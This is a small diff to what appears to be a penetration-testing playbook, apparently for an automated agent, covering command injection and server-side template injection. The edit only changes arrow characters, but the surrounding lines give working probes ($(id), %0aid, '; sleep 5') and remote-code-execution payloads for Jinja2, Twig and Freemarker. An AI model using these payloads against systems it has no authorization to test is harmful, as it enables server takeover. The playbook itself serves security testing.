@@ -36,8 +36,8 @@ For each candidate parameter:
    - `$(id)` (URL-encode as `%24%28id%29`)
    - Newline injection: `%0aid`
 
-3. If `id` output appears → CONFIRMED command injection.
-4. Also test blind: `; sleep 5` — if response delays 5 seconds → CONFIRMED blind.
+3. If `id` output appears -> CONFIRMED command injection.
+4. Also test blind: `; sleep 5` — if response delays 5 seconds -> CONFIRMED blind.
 
 #### STEP 2: EXPLOITATION
 
@@ -57,10 +57,10 @@ Once confirmed:
 #### STEP 3: SSTI (Server-Side Template Injection)
 
 If the parameter reflects user input AND uses template syntax:
-- Jinja2: `{{7*7}}` → if 49 appears → CONFIRMED SSTI
+- Jinja2: `{{7*7}}` -> if 49 appears -> CONFIRMED SSTI
 - Jinja2 RCE: `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`
 - Twig: `{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}`
-- Freemarker: `${7*7}` → if 49 → CONFIRMED. RCE: `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`
+- Freemarker: `${7*7}` -> if 49 -> CONFIRMED. RCE: `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`
 
 #### ANTI-PATTERNS:
 - Do NOT keep probing the same separator if it failed — try a different one
